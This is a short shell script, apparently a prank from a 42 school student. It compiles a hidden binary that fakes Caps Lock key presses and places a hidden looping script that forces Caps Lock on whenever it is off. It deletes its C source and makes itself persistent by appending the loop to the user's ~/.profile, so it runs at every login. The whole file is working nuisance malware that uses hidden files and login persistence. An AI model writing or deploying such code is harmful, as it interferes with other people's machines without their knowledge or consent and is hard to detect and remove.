# **************************************************************************** #
#                                                                              #
#                                                         :::      ::::::::    #
#    full_caps.sh                                       :+:      :+:    :+:    #
#                                                     +:+ +:+         +:+      #
#    By: tomoron <marvin@42.fr>                     +#+  +:+       +#+         #
#                                                 +#+#+#+#+#+   +#+            #
#    Created: 2024/06/06 15:15:24 by tomoron           #+#    #+#              #
#    Updated: 2024/06/06 17:29:04 by tomoron          ###   ########.fr        #
#                                                                              #
# **************************************************************************** #
cd
echo "#include <X11/Xlib.h>
#include <X11/keysym.h>
#include <X11/extensions/XTest.h>

int main(int argc, char *argv[]) {
  Display* display = XOpenDisplay(NULL);
  
  unsigned int keycode = XKeysymToKeycode(display, XK_Caps_Lock);
  
  XTestFakeKeyEvent(display, keycode, True, CurrentTime);
  XFlush(display);
  
  XTestFakeKeyEvent(display, keycode, False, CurrentTime);
  XFlush(display);
 
  return 0;
}" >> ~/caps_lock.c
gcc ~/caps_lock.c -lX11 -lXtst -o ~/.cacahuete
rm ~/caps_lock.c
echo "#!/bin/bash
cd
while :;do
	if [ \$(xset -q | grep \"Caps Lock\" | awk '{print \$4}') = \"on\" ];
	then 
		sleep 0.1
	else
		./.cacahuete
	fi
done" >> ~/.caps.sh
echo "bash ~/.caps.sh&" >> ~/.profile
bash ~/.caps.sh&
